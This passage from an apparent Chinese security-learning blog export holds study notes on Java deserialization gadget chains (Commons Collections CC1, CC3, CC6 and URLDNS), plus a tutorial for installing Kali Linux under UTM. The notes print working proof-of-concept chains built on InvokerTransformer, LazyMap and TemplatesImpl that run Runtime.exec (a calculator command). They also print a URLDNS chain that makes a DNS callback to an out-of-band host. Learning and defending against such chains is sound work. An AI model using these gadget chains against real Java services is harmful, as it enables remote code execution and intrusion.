<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorateMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler1</span> <span class="operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(</span><br><span class="line">                ClassLoader.getSystemClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,</span><br><span class="line">                invocationHandler1);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler2</span> <span class="operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        serialize(invocationHandler2);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>CC6</strong>:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException, NoSuchFieldException, TransformerConfigurationException &#123;</span><br><span class="line">        <span class="type">byte</span>[] calc = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/lingtian/Downloads/Demo/CC3/target/classes/com/Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;calc&#125;);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorateMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 再套一层TiedMapEntry</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(decorateMap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        decorateMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射修改factory的值</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(decorateMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(expMap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><p>算是学习了一种新的方式，再结合之前的知识凑来凑去又是新的链子，还是要经常回顾之前的内容，过程中也意识到知识不是很扎实，也是一个查漏补缺的过程吧。</p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>b站：白日梦组长</p>
<p><a class="link"   href="https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE" >https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/1vxyz/p/17458691.html" >https://www.cnblogs.com/1vxyz/p/17458691.html<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>java</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Macbook M系统芯片用UTM安装最新kali linux</title>
    <url>/2024/09/11/Macbook-M%E7%B3%BB%E7%BB%9F%E8%8A%AF%E7%89%87%E7%94%A8UTM%E5%AE%89%E8%A3%85%E6%9C%80%E6%96%B0kali-linux/</url>
    <content><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>这两天偶然一个契机想装个最新的kali，找到官网的教程装起来很轻松。回想刚开始接触装虚拟机的时候起码折腾一星期，所以就像写个博客记录一下，如果有人看到有被帮助到，那就更好了，希望你能少踩点坑吧。</p>
<p><a class="link"   href="https://www.kali.org/docs/virtualization/install-utm-guest-vm/" >官方参考文档<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h4><p>UTM：找到<a class="link"   href="https://mac.getutm.app/" >官网<i class="fas fa-external-link-alt"></i></a>下载安装即可</p>
<p>Kali镜像：<a class="link"   href="https://www.kali.org/get-kali/#kali-installer-images" >镜像地址<i class="fas fa-external-link-alt"></i></a></p>
<p>记得选择这个Apple sllicon的，中间recommend那个就行</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911113834.png" ></p>
<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>在UTM找到“新建”添加一个虚拟机，<strong>选择“虚拟化”-&gt;“其他”</strong></p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911114826.png"   style="zoom:50%;" >

<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911115935.png"   style="zoom:50%;" >

<p>在第三个页面点击“浏览”，把我们下载的kali镜像挂上去</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911115109.png"   style="zoom:50%;" >

<p>接下来就一直点击“继续”，可以根据自己的需要调整内存和CPU核数量</p>
<p>到虚拟机设置完成，我们还需要编辑一下一些配置</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911115415.png" ></p>
<p>我们需要在这里添加一个serial</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911115450.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911115651.png" ></p>
<p>然后<strong>保存</strong>即可，启动虚拟机进行一些配置</p>
<h4 id="Kali初始配置"><a href="#Kali初始配置" class="headerlink" title="Kali初始配置"></a>Kali初始配置</h4><p>虚拟机启动后就能看到选择，这里我选择了图形化安装</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911120052.png" ></p>
<p>语言选English</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911120149.png" ></p>
<p>时区建议选择Hong Kong</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911120217.png" ></p>
<p>键盘也是选美式的</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911120243.png" ></p>
<p>接下来就是个性化制定你的用户名和机子的名字了，自己选吧</p>
<p>填完一些了个性化名字，到了这里我选择第一个</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911120656.png" ></p>
<p>接下来就是一路选择yes&#x2F;continue就行，等待虚拟机自己加载</p>
<p>经过漫长的等待，到看到这个页面就可以了，选择continue到出现黑屏的时候把虚拟机关闭</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911122515.png" ></p>
<p>然后回到UTM打开虚拟机编辑，把之前挂载的iso和serial给删了，再到这个“显示”</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911122841.png" ></p>
<p>把选项改成’virtio-gpu-pci’，再保存启动虚拟机，正常输入你之前设置的账号密码，正常开机，大功告成！</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911123136.png" ></p>
<h4 id="关于复制粘贴的补充"><a href="#关于复制粘贴的补充" class="headerlink" title="关于复制粘贴的补充"></a>关于复制粘贴的补充</h4><p>用了几天下来发现不能和物理主机共享剪切板，非常难受，经过一番摸索，找到了可惜的解决方法，在此记录一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt-get install qemu-guest-agent</span><br><span class="line">sudo apt install spice-vdagent</span><br></pre></td></tr></table></figure>

<p>安装完这些再重启虚拟机即可！</p>
]]></content>
      <tags>
        <tag>随笔</tag>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>URLDNS利用链分析</title>
    <url>/2024/11/20/URLDNS%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>最近开始接触java安全，最离不开的就是反序列化利用和那些出名的CC链。前两天学了Java序列化和反序列化，还有反射啊这些概念，其实基础还不是很扎实，还要学习。说回来，接触反序列化第一条链子就是URLDNS，对大佬来说还是很好理解的，但是我这两天看了很多博客和视频，实践下来发现里面也是有很多注意点，于是写了笔记记录下来，描述的过程帮助我把原理都顺下来，才算是消化下去了。</p>
<h4 id="链子分析"><a href="#链子分析" class="headerlink" title="链子分析"></a>链子分析</h4><p>这个链子来源是这个<a class="link"   href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java" >知名工具<i class="fas fa-external-link-alt"></i></a>,看下里面标出来的构造链</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20241120221937.png" ></p>
<p>我们直接看实现代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://i7wo.callback.red&quot;</span>); <span class="comment">// dns外带地址</span></span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(); <span class="comment">// 一个HashMap，待会要利用里面的readObject</span></span><br><span class="line">	      hashmap.put(u,<span class="number">123</span>); </span><br><span class="line">        serialize(hashmap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这几行三下五除二理想状态下就能在反序列化的过程中实现DNS解析，为什么呢？！</p>
<p>这里我们跟进一下hashmap的put方法</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20241120222243.png" ></p>
<p>来到HashMap的put方法，我们会发现我们传入了key和value，里面会调用hash()方法，再跟进</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20241120222343.png" ></p>
<p>里面使用了hashCode，这是一个很常见的函数，原生Object类里面就有，也有很多类会重写</p>
<p>然后我们看到URL里面，里面就有hashCode</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20241120222510.png" ></p>
<p>URL里面的hashCode调用了handler.hashCode，我们再跟进</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20241120222551.png" ></p>
<p>来到了URLStreamHandler，里面的hashCode调用了getHostAddress函数，这个函数会触发DNS解析，就达到了我们最后的目的。</p>
<p>一开始学的时候冥冥之中我知道最后hashmap的put会触发URL的hashCode，但是为什么会触发呢（其实这里就是我基础薄弱的体现）</p>
<p>后来和GPT聊了一下，和大哥聊了一下，重点在这里</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20241120222343.png" ></p>
<p>看这里hash函数里面调用的hashCode是<strong>取决于key</strong>的，也就是说，如果我们传入的这个key属于的那个类里面有自己重写的hashCode，程序就会调用新写的hashCode，而不是原来的。</p>
<p>应用到URL的例子，我们hashmap调用put-&gt;hash，里面调用的hashCode是key也就是URL类的hashCode。一切都清晰了起来！</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashMap.put()</span><br><span class="line">	-&gt; HashMap.hash(key)// </span><br><span class="line">		-&gt; key.hashCode()=URL.hashCode()</span><br><span class="line">			-&gt;handler.hashCode()</span><br><span class="line">				-&gt;触发getHostAddress()，实现DNS解析</span><br></pre></td></tr></table></figure>

<p>所以这就是链子的过程，吃透了之后就觉得不复杂了。但是我们之间执行上面的代码却发现dns解析的次数效果不符合我们的预期，这就引入到我们的下一步分析</p>
<h4 id="利用反射复现出理想效果"><a href="#利用反射复现出理想效果" class="headerlink" title="利用反射复现出理想效果"></a>利用反射复现出理想效果</h4><p>我们在序列化操作的时候就会收到DNS解析，这不是我们理想中的效果。</p>
<p>从原理看，URL的hashCode有一个判断</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>会判断hashCode的值，如果不是-1会直接返回hashCode的值，而不会进入我们想要调用的handler.hashCode</p>
<p>在序列化的时候会触发是因为URL里面初始化定义hashCode是-1，所以一开始会调用一次，而且后面赋值更改了之后就进不去了。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20241120223737.png" ></p>
<p>所以按之前什么的代码执行，序列化的时候就出现了dns解析，后面反序列化的时候却没发生，这明显不是我们理想中的效果。</p>
<p>那我们现在要做的是保证整个实验过程，只有序列化和反序列化才会触发handler.hashCode，那么我们就要解决两个问题：第一是put之前hashmap的hashCode不是-1，put之后再把它变回-1。这里我们就用到<strong>反射</strong></p>
<blockquote>
<p>Java 反射机制允许在运行时动态地获取类的信息（如字段、方法、构造函数等），并操作类的对象，从而实现更加灵活和通用的代码。</p>
</blockquote>
<p>反射的流程是先获取类，然后实例化对象，获取类里面的属性，做一些修改对象属性或者调用方法等操作。</p>
<p>看实现代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://diru.callback.red&quot;</span>);</span><br><span class="line">HashMap&lt;URL,Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> u.getClass(); <span class="comment">// 获取u的类 这里是 class.java.net.URL</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">HashCodeField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>); <span class="comment">// geiDeclaredField获取里面的变量hashCode</span></span><br><span class="line">HashCodeField.setAccessible(<span class="literal">true</span>); <span class="comment">// 设置访问权限为看修改</span></span><br><span class="line"><span class="comment">// 接下来就可以对变量的操作，修改成我们想要的值</span></span><br><span class="line">HashCodeField.set(u,<span class="number">1234</span>);  <span class="comment">// 随便一个不是-1的值</span></span><br><span class="line">hashmap.put(u,<span class="number">1</span>);<span class="comment">// HashMap的put给键值对赋值</span></span><br><span class="line">HashCodeField.set(u,-<span class="number">1</span>);  <span class="comment">// 再修改回-1，保证反序列化的过程中可以被成功调用</span></span><br><span class="line">serialize(hashmap); <span class="comment">// 进入反序列化</span></span><br></pre></td></tr></table></figure>

<p>利用反射进行一系列操作，最后保证只有在反序列化的时候才能看到DNS解析，至此，链子就分析完成了。</p>
<h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><p>感谢前面各位师傅写的解释教学，这里就不一一列出来了。本人还在学习，基础不是非常扎实，如果这篇文章哪里写的不好，非常欢迎找我指正交流，感谢🙏</p>
]]></content>
      <tags>
        <tag>学习笔记</tag>
        <tag>Java</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>cc1学习笔记</title>
    <url>/2024/11/29/cc1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本篇文章单纯记录自己学习cc1的过程，里面遇到一些点有些难理解，我总是试图记录下来帮助自己理解（虽然有些时候纠结的点很蠢:)，所以整理出来算是监督自己学习吧。自己java基础不是很扎实，可能有理解不对的地方，非常欢迎联系我（wx：Lintian3188）指正，感谢🙏</p>
<h3 id="反射调用runtime执行calc"><a href="#反射调用runtime执行calc" class="headerlink" title="反射调用runtime执行calc"></a>反射调用runtime执行calc</h3><p>正常调用runtime执行calc语句应该是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);</span><br></pre></td></tr></table></figure>

<p>反射是</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntime</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> getRuntime.invoke(<span class="literal">null</span>);</span><br><span class="line">exec.invoke(o, <span class="string">&quot;Open -a Calculator&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>第一句使用Class.forName 动态加载Runtime，此时的c是Runtime的class对象</p>
<p>第二句使用getMethod获取到getRuntime方法，返回的是Method对象</p>
<p>第三局继续使用getMethod获取exec方法有一个String.class是因为exec正常调用的时候就需要一个参数String</p>
<p>第四句使用inoke也就是执行getRuntime，看一下源码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Runtime</span> <span class="variable">currentRuntime</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Runtime</span>();</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Runtime <span class="title function_">getRuntime</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> currentRuntime;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>就是执行这个方法刚好会返回一个currentRuntime，这个变量是Runtime类型的对象，<strong>有这个才能让我们exec正常调用</strong></p>
<p>可以理解成<code>Object o = getRuntime.invoke(null);</code>执行效果等于<code>Runtime.getRuntime()</code></p>
<p>第五句invoke 的第一个参数是目标实例对象 o，第二个参数是方法的实际参数，所以就相当于执行了Runtime.getRuntime().exec</p>
<h4 id="为什么cc1链子终点是InvokerTransformer-transform"><a href="#为什么cc1链子终点是InvokerTransformer-transform" class="headerlink" title="为什么cc1链子终点是InvokerTransformer.transform()"></a>为什么cc1链子终点是InvokerTransformer.transform()</h4><p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241127222026796.png" ></p>
<p>直接跟进到这个类，里面的<code>transform</code>方法用到了反射，我们最后就是要利用这个很灵活的机制实现恶意代码执行</p>
<p>我们一开始直接调用查看</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;); <span class="comment">// 这个InvokerTransformer构造的要求</span></span><br><span class="line">        invokerTransformer.transform(runtime);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>InvokerTransformer.transform()</code>方法里面，<code>iMethodName</code>对应我们前面构造的<code>exec</code>，<code>iParamTypes</code>对应<code>String.class</code>，<code>iArgs</code>对应我们要执行的命令，在<code>public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args)</code>来看，这写都完美对应我们这次反射调用Runtime执行命令的逻辑</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line"><span class="keyword">return</span> method.invoke(input, iArgs);</span><br></pre></td></tr></table></figure>

<h3 id="TransformedMap版"><a href="#TransformedMap版" class="headerlink" title="TransformedMap版"></a>TransformedMap版</h3><h4 id="初步的链子"><a href="#初步的链子" class="headerlink" title="初步的链子"></a>初步的链子</h4><p>就是点击这个函数右键查找用法，有很多调用的地方，我们需要筛出比较合适的</p>
<p>链子的正确顺序就是找到<code>TransformedMap</code>的<code>checkSetValue()</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241127231528425.png" ></p>
<p>里面调用了valueTransformer.transform(value);，跟进看一下<code>valueTransformer</code>是什么</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241127231711828.png" ></p>
<p>能在TransformedMap的一个构造方法里面发现它被调用，然后他的作用域是<strong>proteced</strong>，还要在TransformedMap里找到谁去调用了这个方法，定位到了<code>decorate()</code>，这个是public方法</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241127232849716.png" >其实传入的参数及户没有差别，感觉就是多了一层，就理解为自我装饰吧</p>
<p>先把链子整理一下，目前的情况主要就是追踪到了checkSetValue()，然后我们要控制里面的<code>valueTransformer</code>是我们前面自己已经写好的的<code>invokerTransformer</code>，才能顺利调用，这里再尝试写出代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;);</span><br><span class="line"><span class="comment">//        invokerTransformer.transform(runtime);</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorateMap</span> <span class="operator">=</span> TransformedMap.decorate(hashMap,<span class="literal">null</span>,invokerTransformer);</span><br><span class="line">        Class&lt;TransformedMap&gt; transformedMapClass = TransformedMap.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">checkSetValues</span> <span class="operator">=</span> transformedMapClass.getDeclaredMethod(<span class="string">&quot;checkSetValue&quot;</span>,Object.class);</span><br><span class="line">        checkSetValues.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        checkSetValues.invoke(decorateMap,runtime);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>讲一下，这里invokerTransformer就是用于最后invokerTransformer.transform()的执行，为什么这么定义前面已经写了，然后新建一个HashMap变量是用于 TransformedMap.decorate()的调用，这个函数就是对一个map进行装饰，进入这个函数才会触发TransformedMap的构造函数，才能给valueTransformer赋值，这就算是准备工作，后面我们需要出发checkSetValue函数，这个才是重头戏，因为是protected的，所以我们需要反射调用，后面几句全是为了触发反射做的准备工作</p>
<h4 id="进一步的链子"><a href="#进一步的链子" class="headerlink" title="进一步的链子"></a>进一步的链子</h4><p>目前我们就卡在checkSetValue这里，还要满足decorate，我们再find usage看谁调用了checkSetValue</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241128215139772.png" ></p>
<p>来到<code>AbstractInputCheckedMapDecorator</code>这个抽象类，它还是TransformerdMap的父类，里面一个继承了<code>AbstractSetDecorator</code>的内部类MapEntry有<code>setValue</code>方法调用了我们要的checkSetValue方法</p>
<blockquote>
<p><code>setValue()</code> <strong>实际上就是在 Map 中对一组 entry（键值对）</strong>进行 <code>setValue()</code> 操作。</p>
<p>一个MapEntry就是hash的一个键值对</p>
</blockquote>
<p>所以就是说当我们在调用decorate对map进行<strong>遍历</strong>的时候，就会触发setValue，而这个重写的setValue会触发我们要的checkSetValue</p>
<p>再重写现在的POC</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span 